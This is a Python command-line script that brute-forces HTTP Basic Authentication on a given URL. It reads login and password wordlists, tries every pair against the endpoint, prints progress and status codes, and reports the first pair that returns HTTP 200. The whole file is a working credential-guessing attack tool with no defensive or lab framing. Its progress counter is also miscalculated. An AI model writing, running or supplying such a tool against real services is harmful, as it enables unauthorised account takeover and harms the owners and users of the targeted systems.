import socket

__author__ = 'mwitas'
import argparse
import os.path
import sys
import requests.auth
import requests.exceptions


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("logins", help="File with logins. Every login in new line")
    parser.add_argument("passwords", help="File with passwords. Every password in new line")
    parser.add_argument("url", help="URL of endpoint to brute force")
    args = parser.parse_args()

    f_logins = args.logins
    f_passwords = args.passwords
    url = args.url

    should_exit = False

    if not os.path.isfile(f_logins):
        print("File %s does not exists." % f_logins)
        should_exit = True

    if not os.path.isfile(f_passwords):
        print("File %s does not exists." % f_passwords)
        should_exit = True

    if should_exit:
        sys.exit(1)

    n_logins = sum(1 for l in open(f_logins))
    n_passwords = sum(1 for l in open(f_passwords))

    d_logins = open(f_logins)
    d_passwords = open(f_passwords)

    from requests.auth import HTTPBasicAuth

    for i, line in enumerate(d_logins):
        login = line[:-1]

        for j, line2 in enumerate(d_passwords):
            password = line2[:-1]

            head = str(i*j+j+1) + "/" + str(n_logins*n_passwords) + "\t" + login + ":" + password + "\t"

            try:
                r = requests.get(url, auth=HTTPBasicAuth(login, password), timeout=5, stream=True)

                if r.status_code == 200:
                    s = "Found valid pair - " + login + ":" + password
                    print(s)
                    should_exit = True
                    break

                s = head + str(r.status_code)
                print(s)

                r.close()
            except requests.exceptions.ConnectionError:
                print(head + "Connection timeout")

        if should_exit:
            break

        d_passwords.seek(0)

    d_logins.close()
    d_passwords.close()

if __name__ == "__main__":
    main()